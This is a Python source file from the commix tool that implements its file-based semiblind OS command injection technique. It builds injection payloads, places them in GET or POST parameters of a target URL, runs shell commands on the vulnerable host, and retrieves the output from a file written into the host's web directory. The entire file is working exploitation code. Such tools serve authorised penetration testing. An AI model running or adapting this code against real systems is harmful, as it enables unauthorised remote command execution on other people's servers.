#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
import time
import string
import random
import base64
import urllib
import urllib2

from src.utils import menu
from src.utils import colors
from src.utils import settings

from src.core.requests import headers
from src.core.requests import parameters

from src.core.injections.semiblind_based.techniques.file_based import fb_payloads

"""
 The "File-based" technique on Semiblind-based OS Command Injection.
"""

#-----------------------------------------
# Check if target host is vulnerable.
#-----------------------------------------
def injection_test(payload,http_request_method,url):
  		    
  # Check if defined method is GET (Default).
  if http_request_method == "GET":
    # Check if its not specified the 'INJECT_HERE' tag
    url = parameters.do_GET_check(url)
    
    # Encoding non-ASCII characters payload.
    payload = urllib.quote(payload)
    
    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_GET_param(url)
    
    target = re.sub(settings.INJECT_TAG, payload, url)
    request = urllib2.Request(target)
    
    # Check if defined extra headers.
    headers.do_check(request)

    # Check if defined any HTTP Proxy.
    if menu.options.proxy:
      try:
	proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
	opener = urllib2.build_opener(proxy)
	urllib2.install_opener(opener)
	response = urllib2.urlopen(request)
      except urllib2.HTTPError, err:
	print "\n" + colors.BGRED + "(x) Error : " + str(err) + colors.RESET
	sys.exit(1) 

    else:
      try:
	response = urllib2.urlopen(request)
	response.read()
      except urllib2.HTTPError, err:
	print "\n" + colors.BGRED + "(x) Error : " + str(err) + colors.RESET
	sys.exit(1) 
	
  # Check if defined method is POST.
  else:
    parameter = menu.options.data
    parameter = urllib2.unquote(parameter)
    
    # Check if its not specified the 'INJECT_HERE' tag
    parameter = parameters.do_POST_check(parameter)
    
    # Define the POST data
    data = re.sub(settings.INJECT_TAG, payload, parameter)
    request = urllib2.Request(url, data)

    # Check if defined extra headers.
    headers.do_check(request)

    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_POST_param(parameter,url)
    
    # Check if defined any HTTP Proxy.
    if menu.options.proxy:
      try:
	proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
	opener = urllib2.build_opener(proxy)
	urllib2.install_opener(opener)
	response = urllib2.urlopen(request)  
      except urllib2.HTTPError, err:
	print "\n" + colors.BGRED + "(x) Error : " + str(err) + colors.RESET
	sys.exit(1) 

    else:
      try:
	response = urllib2.urlopen(request)
	response.read()
      except urllib2.HTTPError, err:
	print "\n" + colors.BGRED + "(x) Error : " + str(err) + colors.RESET
	sys.exit(1) 
      
  return response,vuln_parameter


#----------------------------------------------
# The main command injection exploitation.
#----------------------------------------------
def injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE):
  
  # Execute shell commands on vulnerable host.
  payload = fb_payloads.cmd_execution(separator,cmd,OUTPUT_TEXTFILE) 
  
  # Check if defined "--prefix" option.
  if menu.options.prefix:
    prefix = menu.options.prefix
    payload = prefix + payload
  else:
    payload = prefix + payload
    
  # Check if defined "--suffix" option.
  if menu.options.suffix:
    suffix = menu.options.suffix
    payload = payload + suffix
  else:
    payload = payload + suffix
      
  # Check if defined "--verbose" option.
  if menu.options.verbose:
    sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
		    
  # Check if defined method is GET (Default).
  if http_request_method == "GET":
    # Check if its not specified the 'INJECT_HERE' tag
    url = parameters.do_GET_check(url)
    
    # Encoding non-ASCII characters payload.
    payload = urllib.quote(payload)
    
    target = re.sub(settings.INJECT_TAG, payload, url)
    vuln_parameter = ''.join(vuln_parameter)
    request = urllib2.Request(target)
    
    # Check if defined extra headers.
    headers.do_check(request)	
      
    # Check if defined any HTTP Proxy.
    if menu.options.proxy:
      try:
	proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
	opener = urllib2.build_opener(proxy)
	urllib2.install_opener(opener)
	response = urllib2.urlopen(request)	
      except urllib2.HTTPError, err:
	print "\n" + colors.BGRED + "(x) Error : " + str(err) + colors.RESET
	sys.exit(1) 

    else:
      try:
	response = urllib2.urlopen(request)
      except urllib2.HTTPError, err:
	print "\n" + colors.BGRED + "(x) Error : " + str(err) + colors.RESET
	sys.exit(1) 
      
  else :
    # Check if defined method is POST.
    parameter = menu.options.data
    parameter = urllib2.unquote(parameter)
    
    # Check if its not specified the 'INJECT_HERE' tag
    parameter = parameters.do_POST_check(parameter)
    
    data = re.sub(settings.INJECT_TAG, payload, parameter)
    request = urllib2.Request(url, data)
    
    # Check if defined extra headers.
    headers.do_check(request)	
      
    # Check if defined any HTTP Proxy.
    if menu.options.proxy:
      try:
	proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
	opener = urllib2.build_opener(proxy)
	urllib2.install_opener(opener)
	response = urllib2.urlopen(request)
      except urllib2.HTTPError, err:
	print "\n" + colors.BGRED + "(x) Error : " + str(err) + colors.RESET
	sys.exit(1) 

    else:
      try:
	response = urllib2.urlopen(request)
      except urllib2.HTTPError, err:
	print "\n" + colors.BGRED + "(x) Error : " + str(err) + colors.RESET
	sys.exit(1) 
      
  return response

#-----------------------------
# Command execution results.
#-----------------------------
def injection_results(url,OUTPUT_TEXTFILE,delay):
  
  # Find the correct directory.
  path = url
  path_parts = path.split('/')
  count = 0
  for part in path_parts:	
    count = count + 1
  count = count - 1
  last_param = path_parts[count]
  output = url.replace(last_param, OUTPUT_TEXTFILE)
  time.sleep(delay)

  # Check if defined extra headers.
  request = urllib2.Request(output)
  headers.do_check(request)
  
  # Evaluate test results.
  output = urllib2.urlopen(request)
  html_data = output.read()
  shell = re.findall(r"(.*)", html_data)
  
  return shell

#eof